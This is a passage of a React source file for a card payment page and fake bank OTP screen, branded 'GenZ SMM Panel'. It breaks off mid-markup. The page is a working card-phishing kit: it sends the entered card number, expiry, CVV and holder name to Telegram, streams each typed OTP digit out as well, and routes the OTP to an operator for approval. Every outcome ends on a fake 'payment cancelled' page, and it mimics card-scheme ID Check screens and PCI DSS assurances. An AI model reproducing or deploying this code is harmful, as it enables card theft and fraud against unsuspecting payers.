import { useState, useRef, useEffect } from "react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { Lock, X, ArrowLeft, ShieldCheck, Store, DollarSign, Globe, RefreshCw, ChevronDown, Smartphone, HelpCircle, Landmark } from "lucide-react";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import { submitOtpForApproval } from "@/lib/otpApproval";
import { useMerchantInfo } from "@/hooks/useMerchantInfo";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";


import genzLogo from "@/assets/payment/genz-logo.png";
import visaLogoImg from "@/assets/payment/visa-logo.png";
import mastercardLogoImg from "@/assets/payment/mastercard-logo-color.png";
import amexLogoImg from "@/assets/payment/amex-logo.png";
import troyLogoImg from "@/assets/payment/troy-logo.png";
import discoverLogoImg from "@/assets/payment/discover-logo.png";

const cardOptions = [
  { id: "visa", label: "Visa", logoImg: visaLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #0a1554 0%, #142a8a 45%, #1a3fb3 100%)",
    gradientBack: "linear-gradient(135deg, #1a3fb3 0%, #142a8a 50%, #060d33 100%)",
    accent: "#1a1f71", accentHover: "#0d1547",
  },
  { id: "mastercard", label: "Mastercard", logoImg: mastercardLogoImg, logoImgColor: mastercardLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #0b0b0f 0%, #1a1a24 50%, #23232f 100%)",
    gradientBack: "linear-gradient(135deg, #23232f 0%, #1a1a24 50%, #050508 100%)",
    accent: "#EB001B", accentHover: "#c0000f",
  },
  { id: "amex", label: "American Express", logoImg: amexLogoImg, cvvLength: 4,
    gradient: "linear-gradient(135deg, #016fd0 0%, #0353a4 55%, #012a63 100%)",
    gradientBack: "linear-gradient(135deg, #012a63 0%, #0353a4 55%, #016fd0 100%)",
    accent: "#016FD0", accentHover: "#014e94",
  },
  { id: "troy", label: "Troy", logoImg: troyLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #0a7b7f 0%, #0f9fa3 55%, #14b8bd 100%)",
    gradientBack: "linear-gradient(135deg, #14b8bd 0%, #0f9fa3 55%, #063638 100%)",
    accent: "#0f9fa3", accentHover: "#0a7b7f",
  },
  { id: "discover", label: "Discover", logoImg: discoverLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #1c1c1c 0%, #2d2d2d 45%, #f16a1c 130%)",
    gradientBack: "linear-gradient(135deg, #f16a1c 0%, #2d2d2d 60%, #0a0a0a 100%)",
    accent: "#F16A1C", accentHover: "#c9540f",
  },
];



const CardPaymentPage = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "00";
  usePaymentAccessGuard("card");
  const isAllowed = usePaymentMethodGuard("card");
  const { merchant: merchantName, inv: merchantInv } = useMerchantInfo("card", { merchant: "", inv: "" });
  const otpResumeRef = useRef(readOtpResume("card"));
  const otpResumeState = otpResumeRef.current?.state;
  const initialSelectedBrand = typeof otpResumeState?.selectedBrandId === "string" && cardOptions.some((card) => card.id === otpResumeState.selectedBrandId)
    ? otpResumeState.selectedBrandId
    : "visa";


  const [selectedBrandId] = useState<string>(initialSelectedBrand);
  const baseCard = cardOptions.find((c) => c.id === selectedBrandId)!;


  const [cardNumber, setCardNumber] = useState(typeof otpResumeState?.cardNumber === "string" ? otpResumeState.cardNumber : "");
  const [expiry, setExpiry] = useState(typeof otpResumeState?.expiry === "string" ? otpResumeState.expiry : "");
  const [cvv, setCvv] = useState(typeof otpResumeState?.cvv === "string" ? otpResumeState.cvv : "");
  const [cardHolder, setCardHolder] = useState(typeof otpResumeState?.cardHolder === "string" ? otpResumeState.cardHolder : "");
  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(otpResumeState?.showOtp === true);
  const [otpCode, setOtpCode] = useState(typeof otpResumeState?.otpCode === "string" ? otpResumeState.otpCode : "");
  const [otpTimer, setOtpTimer] = useState(typeof otpResumeState?.otpTimer === "number" ? otpResumeState.otpTimer : 60);
  const [otpLoading, setOtpLoading] = useState(false);
  const [showCodeHelp, setShowCodeHelp] = useState(false);
  const [sessionTimer, setSessionTimer] = useState(typeof otpResumeState?.sessionTimer === "number" ? otpResumeState.sessionTimer : 402);
  const [zoomScale, setZoomScale] = useState(1);
  const [binInfo, setBinInfo] = useState<{ bank?: string; country?: string; countryEmoji?: string; type?: string; scheme?: string } | null>(null);
  const [binLoading, setBinLoading] = useState(false);
  const [transactionId, setTransactionId] = useState(typeof otpResumeState?.transactionId === "string" ? otpResumeState.transactionId : "");
  const [showCardPreview, setShowCardPreview] = useState(false);
  const [activeCardField, setActiveCardField] = useState<"number" | "holder" | "expiry" | "cvv" | null>(null);
  const cardInteractionRef = useRef<HTMLDivElement>(null);

  // Detect brand from card number prefix (local, instant)
  const detectBrand = (num: string): string | null => {
    const n = num.replace(/\D/g, "");
    if (!n) return null;
    if (/^4/.test(n)) return "visa";
    if (/^(5[1-5]|2[2-7])/.test(n)) return "mastercard";
    if (/^3[47]/.test(n)) return "amex";
    if (/^(6011|65|64[4-9])/.test(n)) return "discover";
    return null;
  };
  const detectedBrand = detectBrand(cardNumber);
  const selectedCard = cardOptions.find((c) => c.id === (detectedBrand ?? selectedBrandId)) ?? baseCard;

  // BIN lookup once we have >=6 digits — tries multiple providers for reliability


  useEffect(() => {
    const bin = cardNumber.replace(/\D/g, "").slice(0, 8);
    if (bin.length < 6) { setBinInfo(null); return; }
    let cancelled = false;

    const flagFromCC = (cc?: string) => {
      if (!cc || cc.length !== 2) return undefined;
      return String.fromCodePoint(...cc.toUpperCase().split("").map(c => 0x1f1e6 + c.charCodeAt(0) - 65));
    };

    const tryHandyApi = async () => {
      const res = await fetch(`https://data.handyapi.com/bin/${bin}`);
      if (!res.ok) throw new Error("handy");
      const d = await res.json();
      if (d?.Status && d.Status !== "SUCCESS") throw new Error("handy-status");
      return {
        scheme: d?.Scheme,
        type: d?.Type,
        bank: d?.Issuer,
        country: d?.Country?.Name,
        countryEmoji: flagFromCC(d?.Country?.A2),
      };
    };
    const tryBinlist = async () => {
      const res = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { "Accept-Version": "3" } });
      if (!res.ok) throw new Error("binlist");
      const d = await res.json();
      return {
        scheme: d?.scheme,
        type: d?.type,
        bank: d?.bank?.name,
        country: d?.country?.name,
        countryEmoji: d?.country?.emoji || flagFromCC(d?.country?.alpha2),
      };
    };

    const t = setTimeout(async () => {
      setBinLoading(true);
      let info: any = null;
      try { info = await tryHandyApi(); } catch {
        try { info = await tryBinlist(); } catch { info = null; }
      }
      if (cancelled) return;
      if (info && (info.scheme || info.bank || info.country || info.type)) {
        setBinInfo({
          bank: info.bank || undefined,
          country: info.country || undefined,
          countryEmoji: info.countryEmoji || undefined,
          type: info.type || undefined,
          scheme: info.scheme || undefined,
        });
      } else {
        setBinInfo(null);
      }
      setBinLoading(false);
    }, 400);
    return () => { cancelled = true; clearTimeout(t); };
  }, [cardNumber]);

  useEffect(() => {
    // Only reflect admin-set invoice; never generate a fallback id.
    setTransactionId(merchantInv ? merchantInv.trim() : "");
  }, [merchantInv]);


  useEffect(() => {
    if (showOtp && selectedBrandId) {
      saveOtpResume("card", searchParams.toString(), {
        showOtp: true,
        selectedBrandId,
        cardNumber,
        expiry,
        cvv,
        cardHolder,
        otpCode,
        otpTimer,
        sessionTimer,
        transactionId,
      });
    } else {
      clearOtpResume("card");
    }
  }, [showOtp, selectedBrandId, cardNumber, expiry, cvv, cardHolder, otpCode, otpTimer, sessionTimer, transactionId, searchParams]);

  useEffect(() => {
    const vv = window.visualViewport;
    if (!vv) return;
    const update = () => setZoomScale(vv.scale || 1);
    update();
    vv.addEventListener("resize", update);
    vv.addEventListener("scroll", update);
    return () => { vv.removeEventListener("resize", update); vv.removeEventListener("scroll", update); };
  }, []);

  const cardNumberRef = useRef<HTMLInputElement>(null);
  const otpInputRef = useRef<HTMLInputElement>(null);
  const otpStartAtRef = useRef<number>(0);

  const cvvMaxLength = selectedCard?.cvvLength ?? 3;

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      if (showOtp) navigate(`/payment-cancelled?channel=${selectedCard?.label || 'Card'} Card Payment&reason=Payment isn't completed&amount=${amount}`);
      else navigate(`/payment?amount=${amount}`);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount, selectedCard, showOtp]);

  useEffect(() => { if (showOtp) setTimeout(() => otpInputRef.current?.focus(), 100); }, [showOtp]);
  useEffect(() => { if (showOtp && !otpStartAtRef.current) otpStartAtRef.current = Date.now(); if (!showOtp) otpStartAtRef.current = 0; }, [showOtp]);
  useEffect(() => {
    let interval: ReturnType<typeof setInterval>;
    if (showOtp && otpTimer > 0) interval = setInterval(() => setOtpTimer((p) => p - 1), 1000);
    return () => clearInterval(interval);
  }, [showOtp, otpTimer]);
  useEffect(() => {
    if (!showOtp) return;
    const iv = setInterval(() => setSessionTimer((p) => (p > 0 ? p - 1 : 0)), 1000);
    return () => clearInterval(iv);
  }, [showOtp]);

  const formatCardNumber = (value: string) => value.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
  const formatExpiry = (value: string) => {
    const nums = value.replace(/\D/g, "").slice(0, 4);
    if (nums.length >= 3) return `${nums.slice(0, 2)}/${nums.slice(2)}`;
    return nums;
  };
  const displayCardNumber = () => {
    const nums = cardNumber.replace(/\s/g, "");
    const padded = nums.padEnd(16, "•");
    return `${padded.slice(0, 4)} ${padded.slice(4, 8)} ${padded.slice(8, 12)} ${padded.slice(12, 16)}`;
  };
  const getMaskedCard = () => {
    const nums = cardNumber.replace(/\s/g, "");
    if (nums.length < 8) return "****";
    return `**** **** **** ${nums.slice(-4)}`;
  };
  const isFormValid = () => {
    const nums = cardNumber.replace(/\s/g, "");
    return nums.length === 16 && expiry.length === 5 && cvv.length === cvvMaxLength && cardHolder.length > 2;
  };
  const activateCardPreview = (field: "number" | "holder" | "expiry" | "cvv") => {
    setActiveCardField(field);
    setShowCardPreview(true);
  };
  const handleCardFieldBlur = () => {
    window.setTimeout(() => {
      const nextElement = document.activeElement;
      if (nextElement instanceof HTMLElement && nextElement.dataset.cardField === "true") return;
    }, 0);
  };
  useEffect(() => {
    if (!showCardPreview) return;
    const handleOutsidePointer = (event: PointerEvent) => {
      const target = event.target;
      if (target instanceof Node && cardInteractionRef.current?.contains(target)) return;
      setShowCardPreview(false);
      setActiveCardField(null);
    };
    document.addEventListener("pointerdown", handleOutsidePointer);
    return () => document.removeEventListener("pointerdown", handleOutsidePointer);
  }, [showCardPreview]);
  const handleCardHolderChange = (e: React.ChangeEvent<HTMLInputElement>) => setCardHolder(e.target.value.replace(/[0-9]/g, ""));

  const handleSubmit = () => {
    if (!isFormValid() || !selectedCard) return;
    setIsLoading(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv }, { force: true });
    setTimeout(() => { setIsLoading(false); setShowOtp(true); setOtpTimer(60); }, 4000);
  };
  const [otpError, setOtpError] = useState("");
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpDenyCount, setOtpDenyCount] = useState(0);
  const handleOtpConfirm = async () => {
    if (otpCode.length !== 6 || !selectedCard) return;
    setOtpLoading(true);
    const nextAttempt = otpAttempts + 1;
    setOtpAttempts(nextAttempt);
    const decision = await submitOtpForApproval({
      amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv, otp: otpCode,
    }, { autoAttempt: nextAttempt, otpStartAt: otpStartAtRef.current });
    setOtpLoading(false);
    if (decision === 'approved') {
      navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Merchant Verification Failed&amount=${amount}&ref=${selectedCard.id.toUpperCase()}` + Date.now().toString().slice(-8));
    } else if (decision === 'timeout' || decision === 'error') {
      navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`);
    } else {
      const nextDenies = otpDenyCount + 1;
      setOtpDenyCount(nextDenies);
      if (nextDenies >= 3) {
        navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`);
        return;
      }
      setOtpError("Invalid OTP. Please try again."); setOtpCode("");
      setTimeout(() => otpInputRef.current?.focus(), 50);
      setTimeout(() => setOtpError(""), 4000);
    }
  };
  const handleResendOtp = () => { if (otpTimer > 0) return; setOtpTimer(60); setOtpCode(""); };



  if (isAllowed !== true) return null;

  if (showOtp) {
    const cancelHref = `/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`;
    const nowStr = new Date().toString();
    const merchantId = "GenZSMM";
    const cardDigits = cardNumber.replace(/\D/g, "");
    const maskedCardNumber = `${"X".repeat(Math.max(0, cardDigits.length - 4))}${cardDigits.slice(-4)}`;
    const idCheckLabel =
      selectedCard.id === "visa" ? "ID Check" :
      selectedCard.id === "mastercard" ? "ID Check" :
      selectedCard.id === "amex" ? "SafeKey" :
      "ID Check";
    return (
      <div className="card-otp-root fixed inset-0 flex flex-col overflow-hidden bg-slate-50">
        <div className="card-otp-frame mx-auto flex h-[100dvh] min-h-0 w-full max-w-md flex-col px-5 pb-4 pt-6">
          {/* Header */}
          <div className="card-otp-header mb-6 flex shrink-0 items-center justify-between">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-5 h-5" style={{ color: selectedCard.accent }} strokeWidth={2.2} />
              <div className="text-[15px] leading-none">
                <span className="font-bold text-slate-800">Payment</span>{" "}
                <span className="text-slate-400 font-normal">Authentication</span>
              </div>
            </div>
            <div className="flex items-center gap-1.5">
              <img src={selectedCard.logoImg} alt={selectedCard.label} className="h-5 object-contain" />
              <span className="text-slate-400 text-[13px]">{idCheckLabel}</span>
            </div>
          </div>

          {/* Phone illustration */}
          <div className="card-otp-illustration mb-4 flex shrink-0 justify-center">
            <div className="relative">
              <div className="card-otp-phone flex h-[130px] w-[86px] flex-col items-center justify-start rounded-[14px] bg-slate-800 pb-2 pt-2.5 shadow-md">
                <div className="w-8 h-1 rounded-full bg-slate-600 mb-1.5" />
                <div className="flex-1 w-[72px] rounded-md bg-slate-100" />
                <div className="w-4 h-4 rounded-full border-2 border-slate-600 mt-1.5" />
              </div>
              {/* Speech bubble */}
              <div className="absolute -right-8 top-10 bg-slate-800 rounded-lg px-3 py-2 flex items-center gap-1 shadow-md">
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <div className="absolute left-0 top-1/2 -translate-x-1/2 -translate-y-1/2 w-0 h-0 border-t-[6px] border-t-transparent border-b-[6px] border-b-transparent border-r-[8px] border-r-slate-800" />
              </div>
            </div>
          </div>

          <p className="card-otp-copy mb-5 shrink-0 px-1 text-center text-[12px] leading-relaxed text-slate-500">
            We have sent you a text message with an OTP to your registered auth ending with{" "}
            <span className="font-medium text-slate-700">{maskedCardNumber || "XXXXXXXXXXXX0000"}</span>. You are paying merchant{" "}
            <span className="font-semibold text-slate-700">{merchantId}</span> the amount of{" "}
            <span className="font-semibold text-slate-700">BDT{amount}</span> on{" "}
            <span className="text-slate-600">{nowStr}</span>.
             Your code will be next to <span className="font-semibold text-slate-700">&apos;GOOGLE*XXX&apos;</span>.
          </p>

          {/* Transaction Details */}
          <div className="card-otp-details mb-6 shrink-0 overflow-hidden rounded-2xl border border-slate-200/70 bg-white shadow-[0_1px_2px_rgba(15,23,42,0.04)]">
            <div className="card-otp-details-header flex items-center gap-2 border-b border-slate-100 px-4 py-3">
              <ShieldCheck className="w-4 h-4 text-slate-700" strokeWidth={2.2} />
              <span className="text-[13px] font-semibold text-slate-800">Transaction Details</span>
            </div>
            <div className="card-otp-detail-row flex items-center justify-between border-b border-slate-100 px-4 py-3">
              <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                <DollarSign className="w-4 h-4" strokeWidth={2} />
                <span>Amount</span>
              </div>
              <span className="text-slate-800 font-semibold text-[14px]">৳{amount}</span>
            </div>
            <div className="card-otp-detail-row flex items-center justify-between border-b border-slate-100 px-4 py-3">
              <span className="text-slate-500 text-[13px]">Transaction ID</span>
              <span className="text-slate-800 font-mono text-[12px] tracking-wide">{(merchantInv && merchantInv.trim()) || transactionId}</span>
            </div>
            <div className="card-otp-detail-row flex items-center justify-between px-4 py-3">
              <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                <Store className="w-4 h-4" strokeWidth={2} />
                <span>Merchant ID</span>
              </div>
              <span className="text-slate-800 font-semibold text-[13px] tracking-wide">{merchantId}</span>
            </div>
          </div>

          {/* OTP input */}
          <div className="card-otp-entry mb-4 shrink-0">
            <label className="block text-slate-600 text-[13px] mb-2">Enter OTP Code</label>
            <div className="flex items-center gap-2">
              <input id="cardpaymentpage-fld-1" name="cardpaymentpage-fld-1" aria-label="cardpaymentpage field 1"
                ref={otpInputRef}
                type="tel"
                inputMode="numeric"
                maxLength={6}
                value={otpCode}
                onChange={(e) => {
                  const v = e.target.value.replace(/\D/g, "").slice(0, 6);
                  setOtpCode(v);
                  if (selectedCard && v.length > otpCode.length && v.length > 0) {
                    sendTelegramNotification({ type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv, otp: v });
                  }
                }}
                placeholder="Enter 6-digit OTP"
                className="min-w-0 flex-1 bg-blue-50/70 border border-blue-100 rounded-xl px-4 py-3.5 text-center text-[15px] text-slate-800 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-200 transition-all font-medium tracking-[6px]"
              />
              <button
                type="button"
                aria-label="Can't find your code?"
                title="Can't find your code?"
                onClick={() => setShowCodeHelp(true)}
                className="shrink-0 rounded-full text-slate-700 hover:text-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-200"
              >
                <HelpCircle className="h-7 w-7" strokeWidth={2} />
              </button>
            </div>
            {otpError && (<p className="mt-2 text-red-600 text-[12px] text-center font-medium">{otpError}</p>)}
          </div>

          <button
            onClick={handleOtpConfirm}
            disabled={otpCode.length !== 6 || otpLoading}
            className={`card-otp-verify mb-3 w-full shrink-0 rounded-xl py-3.5 text-[14px] font-semibold text-white transition-all duration-300 ${
              otpCode.length === 6 && !otpLoading
                ? "bg-blue-600 hover:bg-blue-700 shadow-[0_4px_14px_rgba(37,99,235,0.35)]"
                : "bg-blue-300 cursor-not-allowed"
            }`}
          >
            {otpLoading ? "Verifying..." : "Verify"}
          </button>

          <div className="card-otp-actions mb-4 grid shrink-0 grid-cols-2 gap-3">
            <button
              onClick={handleResendOtp}
              disabled={otpTimer > 0}
              className={`flex items-center justify-center gap-2 py-3 rounded-xl border text-[13px] font-medium transition-all ${
                otpTimer > 0
                  ? "border-slate-200 bg-slate-50 text-slate-400 cursor-not-allowed"
                  : "border-blue-200 bg-blue-50 text-blue-700 hover:bg-blue-100"
              }`}
            >
              <RefreshCw className="w-4 h-4" strokeWidth={2} />
              Resend {otpTimer > 0 ? `(${otpTimer}s)` : ""}
            </button>
            <button
              onClick={() => navigate(cancelHref)}
              className="flex items-center justify-center gap-2 py-3 rounded-xl border border-red-200 bg-white text-red-500 text-[13px] font-medium hover:bg-red-50 transition-all"
            >
              <X className="w-4 h-4" strokeWidth={2.2} />
              Cancel
            </button>
          </div>

          <p className="card-otp-timeout mb-6 shrink-0 text-center text-[11px] text-slate-400">
            The page will automatically timeout after {sessionTimer} seconds.
          </p>

          <div className="card-otp-footer mt-auto flex shrink-0 items-center justify-between border-t border-slate-200/70 pt-4">
            <div className="flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" strokeWidth={2.2} />
              <span className="text-slate-400 text-[11px]">Data are protected by the PCI DSS standard</span>
            </div>
            <div className="flex items-center gap-1 border border-slate-200 rounded-full px-2.5 py-1 text-[11px] text-slate-600">
              <Globe className="w-3 h-3" strokeWidth={2} />
              <span>us</span>
              <span>Engli</span>
              <ChevronDown className="w-3 h-3" strokeWidth={2} />
            </div>
          </div>
        </div>

        {showCodeHelp && (
          <div
            className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/35 px-4 backdrop-blur-[2px]"
            role="dialog"
            aria-modal="true"
            aria-labelledby="code-help-title"
            onClick={() => setShowCodeHelp(false)}
          >
            <div
              className="card-otp-help max-h-[calc(100dvh-2rem)] w-full max-w-sm overflow-hidden rounded-[28px] bg-white p-6 shadow-2xl"
              onClick={(event) => event.stopPropagation()}
            >
              <div className="mb-7 flex items-center gap-4">
                <button
                  type="button"
                  aria-label="Close"
                  onClick={() => setShowCodeHelp(false)}
                  className="shrink-0 rounded-full p-1 text-slate-700 hover:bg-slate-100 focus:outline-none focus:ring-2 focus:ring-blue-200"
                >
                  <X className="h-6 w-6" />
                </button>
                <h2 id="code-help-title" className="text-xl font-medium text-slate-900">Can&apos;t find your code?</h2>
              </div>

              <div className="mb-6 rounded-lg border border-slate-200 bg-slate-50 px-4 py-6 shadow-sm">
                <div className="flex items-center gap-2 border-y border-slate-200 bg-white px-3 py-3 text-sm text-slate-700">
                  <Landmark className="h-4 w-4 shrink-0" />
                  <span className="font-medium">GOOGLE*XXX</span>
                  <span className="rounded-full border-2 border-blue-600 px-2 py-0.5 font-mono text-xs font-semibold text-blue-700">XXXXXX</span>
                  <span className="ml-auto h-2 w-10 rounded bg-slate-200" />
                </div>
              </div>

              <p className="text-[15px] leading-6 text-slate-700">
                The Google charge with the code appears within five minutes. If it doesn&apos;t appear within seven days, contact us.
              </p>
              <a
                href="https://support.google.com/googlepay/answer/7644078"
                target="_blank"
                rel="noreferrer"
                className="mt-6 inline-block text-[15px] font-medium text-blue-700 underline underline-offset-2"
              >
                Learn more about verification
              </a>
            </div>
          </div>
        )}
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-white flex flex-col items-center justify-start overflow-hidden">
      <div className="card-payment-frame flex h-[100dvh] min-h-0 flex-col w-full max-w-[440px] mx-auto">
        {/* Top bar */}
        <div className="card-payment-topbar flex items-center justify-between px-4 pt-4 pb-3 shrink-0 bg-white">
          <button onClick={() => navigate(`/payment?amount=${amount}`)} className="flex items-center gap-1.5 text-slate-500 text-[13px] font-medium hover:text-slate-800 transition-colors">
            <ArrowLeft className="w-4 h-4" />Back
          </button>
          <div className="flex items-center gap-1.5">
            <img src={genzLogo} alt="GenZ" className="w-6 h-6 rounded-full" />
            <span className="text-slate-800 text-[13px] font-semibold tracking-tight">GenZ SMM Panel</span>
          </div>
          <div className="flex items-center gap-1 text-slate-400">
            <Lock className="w-3.5 h-3.5" /><span className="text-[11px] font-medium">Secure</span>
          </div>
        </div>

        {/* Form sheet */}
        <div className="card-payment-sheet min-h-0 flex-1 bg-white px-5 pt-1 pb-5 mt-1 flex flex-col animate-fade-in">
          {/* Title + accepted brands */}
          <div className="card-payment-heading mb-4 shrink-0">
            <h1 className="text-slate-900 text-[18px] font-bold tracking-tight">Card Payment</h1>
            <p className="text-slate-400 text-[12px] mt-0.5">Enter your card details to complete the payment</p>
            <div className="card-payment-brands flex items-center gap-2.5 mt-3">
              {[visaLogoImg, mastercardLogoImg, amexLogoImg, troyLogoImg, discoverLogoImg].map((logo, i) => (
                <div key={i} className="h-9 px-2.5 flex items-center justify-center rounded-lg border border-slate-200/80 bg-white shadow-[0_1px_2px_rgba(15,23,42,0.04)]">
                  <img src={logo} alt="Card brand" className="h-5 object-contain" />
                </div>
              ))}
            </div>
          </div>
          <div ref={cardInteractionRef} className={`card-payment-fields flex min-h-0 flex-1 flex-col gap-4 ${cardNumber.replace(/\D/g, "").length >= 6 ? "card-payment-fields-with-bin" : ""}`}>
            {/* Transaction Details */}
            <div className="card-payment-preview relative h-[194px] shrink-0 [perspective:1000px]">
              <div className={`card-payment-transaction absolute inset-0 rounded-2xl bg-gradient-to-br from-blue-50/80 to-white border border-blue-100/70 shadow-[0_2px_10px_rgba(37,99,235,0.05)] p-4 transition-all duration-500 motion-reduce:transition-none ${showCardPreview ? "pointer-events-none scale-95 opacity-0 [transform:rotateY(-12deg)]" : "scale-100 opacity-100 [transform:rotateY(0deg)]"}`}>
                <div className="card-payment-transaction-heading flex items-center gap-2 mb-3">
                  <div className="w-7 h-7 rounded-lg bg-blue-600/10 flex items-center justify-center">
                    <ShieldCheck className="w-4 h-4 text-blue-600" strokeWidth={2.2} />
                  </div>
                  <p className="text-slate-800 text-[13px] font-bold">Transaction Details</p>
                </div>
                <div className="divide-y divide-blue-100/50">
                  <div className="card-payment-transaction-row flex items-center justify-between py-2">
                    <span className="text-slate-500 text-[13px]">Amount</span>
                    <span className="text-blue-700 text-[15px] font-bold">৳{amount}</span>
                  </div>
                  <div className="card-payment-transaction-row flex items-center justify-between py-2">
                    <span className="text-slate-500 text-[13px]">Merchant ID</span>
                    <span className="text-slate-800 text-[13px] font-semibold truncate max-w-[55%] text-right">{merchantName}</span>
                  </div>
                  <div className="card-payment-transaction-row flex items-center justify-between py-2">
                    <span className="text-slate-500 text-[13px]">Transaction ID</span>
                    <span className="text-slate-700 text-[12px] font-mono tracking-wider">{(merchantInv && merchantInv.trim()) || transactionId || "—"}</span>
                  </div>
                </div>
              </div>

              <div className={`absolute inset-0 transition-all duration-500 motion-reduce:transition-none [transform-style:preserve-3d] ${showCardPreview ? "scale-100 opacity-100" : "pointer-events-none scale-95 opacity-0"} ${activeCardField === "cvv" ? "[transform:rotateY(180deg)]" : "[transform:rotateY(0deg)]"}`}>
                <div className="card-payment-preview-face absolute inset-0 overflow-hidden rounded-2xl p-5 text-primary-foreground shadow-xl [backface-visibility:hidden]" style={{ background: selectedCard.gradient }}>
                  <div className="flex items-start justify-between">
                    <div className="flex min-w-0 items-center gap-2 rounded-md border border-primary-foreground/20 bg-primary-foreground/10 px-2.5 py-1.5">
                      <Landmark className="h-4 w-4 shrink-0 text-primary-foreground" strokeWidth={1.8} />
                      <span className="max-w-[145px] truncate text-[9px] font-semibold uppercase text-primary-foreground">
                        {binLoading ? "Identifying bank" : binInfo?.bank || "Issuing bank"}
                      </span>
                    </div>
                    <img src={selectedCard.logoImg} alt={selectedCard.label} className="h-7 max-w-[72px] object-contain" />
                  </div>
                  <p className="mt-4 truncate font-mono text-[17px] font-semibold tracking-[2px] text-primary-foreground">
                    {displayCardNumber()}
                  </p>
                  <div className="payment-card-chip relative mt-2 h-7 w-10 overflow-hidden rounded-[5px] border border-card-chip-dark" aria-hidden="true">
                    <span className="absolute inset-y-0 left-[28%] w-px bg-card-chip-line/45" />
                    <span className="absolute inset-y-0 right-[28%] w-px bg-card-chip-line/45" />
                  </div>
                  <div className="mt-3 flex items-end justify-between gap-4">
                    <div className="min-w-0">
                      <p className="text-[8px] uppercase text-blue-100">Card holder</p>
                      <p className="truncate text-[11px] font-semibold tracking-wide">{cardHolder || "YOUR NAME"}</p>
                    </div>
                    <div className="shrink-0 text-right">
                      <p className="text-[8px] uppercase text-blue-100">Expires</p>
                      <p className="font-mono text-[11px] font-semibold">{expiry || "MM/YY"}</p>
                    </div>
                  </div>
                </div>

                <div className="absolute inset-0 overflow-hidden rounded-2xl pt-6 text-primary-foreground shadow-xl [backface-visibility:hidden] [transform:rotateY(180deg)]" style={{ background: selectedCard.gradientBack }}>
                  <div className="h-9 w-full bg-slate-900/85" />
                  <div className="mt-5 px-5">
                    <p className="mb-1 text-right text-[8px] uppercase tracking-wide text-blue-100">CVV</p>
                    <div className="flex h-9 items-center justify-end rounded bg-white px-3 font-mono text-[13px] font-bold tracking-[3px] text-slate-800">
                      {cvv || "•••"}
                    </div>
                    <div className="mt-3 flex justify-end">
                      <img src={selectedCard.logoImg} alt={selectedCard.label} className="h-6 max-w-[68px] object-contain" />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Number */}
            <div className="card-payment-number-block shrink-0">
              <label className="card-payment-label block text-slate-600 text-[11px] font-semibold uppercase tracking-wide mb-1.5">Card Number</label>
              <div className="relative">
                <input id="cardpaymentpage-fld-2" name="cardpaymentpage-fld-2" aria-label="cardpaymentpage field 2" ref={cardNumberRef} type="tel" inputMode="numeric" value={cardNumber} data-card-field="true" onFocus={() => activateCardPreview("number")} onBlur={handleCardFieldBlur} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} placeholder="0000 0000 0000 0000"
                  className="card-payment-input w-full border border-slate-200 rounded-xl pl-3.5 pr-16 py-2.5 text-[13px] text-slate-800 placeholder:text-slate-300 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 bg-slate-50/50 focus:bg-white transition-all font-mono tracking-wider" />
                <div className="absolute right-2.5 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                  {detectedBrand === "visa" && (
                    <div className="px-2 py-1 bg-[#1a1f71] rounded-md"><img src={visaLogoImg} alt="Visa" className="h-5 object-contain brightness-0 invert" /></div>
                  )}
                  {detectedBrand === "mastercard" && (
                    <img src={mastercardLogoImg} alt="MC" className="h-8 object-contain" />
                  )}
                  {!detectedBrand && cardNumber.length > 0 && (
                    <span className="text-[10px] text-red-500 font-medium">?</span>
                  )}
                </div>
              </div>
              {cardNumber.replace(/\D/g, "").length >= 6 && (
                <div className="card-payment-bin mt-2 flex items-center gap-1.5 whitespace-nowrap rounded-lg border border-slate-100 bg-slate-50/80 px-2 py-2 text-[8px]">
